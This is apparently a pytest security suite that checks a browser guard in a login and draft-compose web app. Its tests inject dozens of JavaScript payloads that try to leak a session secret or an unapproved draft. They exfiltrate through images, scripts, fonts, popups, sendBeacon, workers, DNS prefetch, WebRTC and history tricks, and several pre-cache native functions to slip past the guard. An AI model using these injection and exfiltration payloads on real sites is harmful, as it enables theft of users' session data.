import json, time, socket, threading, base64
import pytest
from test_m18_login_browser import setup, _compose_with_values, setup_daemon  # noqa
from test_m18_login_round5 import _nav_click
from test_aud_round7 import SECRET, leaked, on_click, X, D, POST, BTN

UDP=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);UDP.bind(('127.0.0.1',0));UDP_PORT=UDP.getsockname()[1];UDP.settimeout(0.1)
HOOK_ASSET = "<script>try{new Image().src='/a/'+btoa(sessionStorage.getItem('s'))}catch(e){}</script>"
HOOK_ASSET_LATE = "<script>setTimeout(()=>{new Image().src='/a/'+btoa(sessionStorage.getItem('s'))},6000)</script>"
HOOK_SCRIPT = "<script>try{var s=document.createElement('script');s.src='/s/'+btoa(sessionStorage.getItem('s'))+'.js';document.head.appendChild(s)}catch(e){}</script>"
HOOK_CSS = "<script>try{var s=document.createElement('link');s.rel='stylesheet';s.href='/c/'+btoa(sessionStorage.getItem('s'))+'.css';document.head.appendChild(s)}catch(e){}</script>"
HOOK_AUDIO = "<script>try{var a=new Audio('/au/'+btoa(sessionStorage.getItem('s'))+'.mp3');a.load()}catch(e){}</script>"
HOOK_WINNAME = "<script>try{new Image().src='/w/'+btoa(window.name)}catch(e){}</script>"
HOOK_XORIGIN_ASSET = "<script>try{new Image().src='http://localhost:'+location.port+'/x/'+btoa(sessionStorage.getItem('s'))}catch(e){}</script>"
HOOK_POPUP = "<script>try{window.open('http://localhost:'+location.port+'/po/'+btoa(sessionStorage.getItem('s')))}catch(e){}</script>"
HOOK_META_REMOVE_FETCH = "<script>document.querySelectorAll('meta').forEach(m=>m.remove());try{fetch('/f/'+btoa(sessionStorage.getItem('s')))}catch(e){}</script>"

TWO_DOC = {
 'nav_asset_path_img': HOOK_ASSET, 'nav_asset_path_img_6s': HOOK_ASSET_LATE, 'nav_asset_path_script': HOOK_SCRIPT,
 'nav_asset_path_css': HOOK_CSS, 'nav_asset_path_audio': HOOK_AUDIO, 'nav_windowname_img': HOOK_WINNAME,
 'nav_xorigin_img': HOOK_XORIGIN_ASSET, 'nav_popup': HOOK_POPUP, 'nav_meta_remove_fetch_get': HOOK_META_REMOVE_FETCH,
}

@pytest.mark.asyncio
@pytest.mark.parametrize('name', sorted(TWO_DOC))
async def test_two_doc(setup, name):
    page, _ = await _compose_with_values(setup); site = setup[6]
    await page.fill('#draft', SECRET)
    await page.evaluate(f"sessionStorage.setItem('s',{json.dumps(SECRET)}); window.name={json.dumps(SECRET)};document.body.insertAdjacentHTML('beforeend','<a id=attack href=\"/compose\">go</a>')")
    site.html_hook = lambda html, h=TWO_DOC[name]: html.replace('<body>', '<body>' + h)
    site.hits.clear(); site.posts.clear(); site.post_paths.clear()
    try:
        answer = await _nav_click(setup, '#attack')
        for _ in range(14): await page.wait_for_timeout(700)
    finally:
        site.html_hook = None
    print(f"RESULT {name}: ok={answer['ok']} err={str(answer.get('error'))[:80]!r} leaked={leaked(site)} hits={[h[0][:9]+h[2][:40] for h in site.hits if h[2] != '/compose'][:6]}")
    assert not leaked(site) and not site.posts, (name, leaked(site), site.posts)

V2 = {
 'same_origin_top_nav_path_b64': on_click(f"location.href='/idea/'+btoa({D})"),
 'same_origin_top_nav_path_hex6s': on_click(f"location.href='/idea/'+[...{D}].map(c=>c.charCodeAt(0).toString(16)).join('')", 6000),
 'same_origin_top_nav_query_b64': on_click(f"location.href='/idea?d='+btoa({D})"),
 'meta_removed_xorigin_img': on_click(f"document.querySelectorAll('meta').forEach(m=>m.remove());new Image().src={X}+'/m/'+btoa({D})"),
 'meta_removed_then_cachedfetch_post': "window.__f=window.fetch;" + on_click(f"document.querySelectorAll('meta').forEach(m=>m.remove());window.__f('/publish',{POST})"),
 'cached_sendbeacon': "window.__b=navigator.sendBeacon.bind(navigator);" + on_click(f"window.__b('/publish',new Blob(['draft=UNAPPROVEDSECRET&run_id=a'],{{type:'application/x-www-form-urlencoded'}}))"),
 'cached_open_popup_during': "window.__o=window.open;" + on_click(f"window.__o({X}+'/po/'+btoa({D}))"),
 'cached_open_popup_6s': "window.__o=window.open;" + on_click(f"window.__o({X}+'/po/'+btoa({D}))", 6000),
 'cached_open_popup_12s': "window.__o=window.open;" + on_click(f"window.__o({X}+'/po/'+btoa({D}))", 12000),
 'cached_form_submit_proto_6s': "window.__fs=HTMLFormElement.prototype.submit;" + on_click("const f=document.createElement('form');f.method='post';f.action='/publish';f.innerHTML='<input name=draft value=UNAPPROVEDSECRET><input name=run_id value=a>';document.body.appendChild(f);window.__fs.call(f)", 6000),
 'dns_prefetch_secretlabel': on_click(f"const l=document.createElement('link');l.rel='dns-prefetch';l.href='//'+{D}.toLowerCase()+'.localhost';document.head.appendChild(l)"),
 'preconnect_path': on_click(f"const l=document.createElement('link');l.rel='preconnect';l.href={X};document.head.appendChild(l)"),
 'new_iframe_srcdoc_fetch': on_click(f"const f=document.createElement('iframe');f.srcdoc='<script>fetch(\"/publish\",{{method:\"POST\",headers:{{\"content-type\":\"application/x-www-form-urlencoded\"}},body:\"draft=UNAPPROVEDSECRET&run_id=a\"}})<\\/script>';document.body.appendChild(f)"),
 'worker_blob_fetch_post': on_click("const b=new Blob([\"fetch('/publish',{method:'POST',headers:{'content-type':'application/x-www-form-urlencoded'},body:'draft=UNAPPROVEDSECRET&run_id=a'})\"]);new Worker(URL.createObjectURL(b))"),
 'worker_blob_fetch_post_9s': on_click("const b=new Blob([\"setTimeout(()=>fetch('/publish',{method:'POST',headers:{'content-type':'application/x-www-form-urlencoded'},body:'draft=UNAPPROVEDSECRET&run_id=a'}),9000)\"]);new Worker(URL.createObjectURL(b))"),
 'sharedworker_or_bc_other_tab': "window.__bc=new BroadcastChannel('x');" + on_click("window.__bc.postMessage('draft=UNAPPROVEDSECRET&run_id=a')", 3500),
 'webrtc_udp_canary': on_click("const pc=new RTCPeerConnection({iceServers:[{urls:'stun:127.0.0.1:%d'}]});pc.createDataChannel('x');pc.createOffer().then(o=>pc.setLocalDescription(o))" % UDP_PORT),
 'xorigin_head_via_link_tag_modulepreload': on_click(f"const l=document.createElement('link');l.rel='modulepreload';l.href={X}+'/mp/'+btoa({D});document.head.appendChild(l)"),
 'import_script_same_origin_path': on_click(f"const s=document.createElement('script');s.src='/js/'+btoa({D})+'.js';document.head.appendChild(s)"),
 'img_same_origin_path_known_prefix': on_click(f"new Image().src='/idea/'+btoa({D})"),
 'css_url_font': on_click(f"const s=document.createElement('style');s.textContent='@font-face{{font-family:x;src:url(/f/'+btoa({D})+'.woff)}} body{{font-family:x}}';document.head.appendChild(s)"),
 'window_name_nav': on_click(f"window.name=btoa({D});location.href='/idea'"),
 'history_replace_then_img': on_click(f"history.pushState({{}}, '', '/z/'+btoa({D}));new Image().src='/q'"),
 'referrer_leak_via_pushstate_then_nav': on_click(f"history.replaceState({{}}, '', '/z/'+btoa({D}));location.href='/idea'"),
}
@pytest.mark.asyncio
@pytest.mark.parametrize('name', sorted(V2))
async def test_v(setup, name):
    page, _ = await _compose_with_values(setup); site = setup[6]
    other = None
    if 'other_tab' in name:
        other = await page.context.new_page(); await other.goto(setup[1].origin+'/compose')
        await other.evaluate("(()=>{window.__bc=new BroadcastChannel('x');__bc.onmessage=e=>fetch('/publish',{method:'POST',headers:{'content-type':'application/x-www-form-urlencoded'},body:e.data})})()")
    await page.fill('#draft', SECRET)
    try:
        await page.evaluate(V2[name])
    except Exception as error:  # round 9/10: BroadcastChannel is denied in session pages; setup throws
        assert 'blocked by Atlas guard' in str(error), error
        await page.evaluate("document.body.insertAdjacentHTML('beforeend','<button id=attack type=button>go</button>')")
    site.hits.clear(); site.posts.clear(); site.post_paths.clear()
    answer = await _nav_click(setup, '#attack')
    for _ in range(20 if '12s' in name else 14): await page.wait_for_timeout(700)
    udp=[]
    try:
        while True: udp.append(UDP.recvfrom(2000)[0][:12])
    except Exception: pass
    print(f"RESULT {name}: udp_packets={len(udp)} ok={answer['ok']} err={str(answer.get('error'))[:80]!r} leaked={leaked(site)} posts={site.posts} hits={[h[0][:9]+h[2][:40] for h in site.hits if h[2] != '/compose'][:6]}")
    assert not leaked(site) and not site.posts and not udp, (name, site.posts, len(udp))
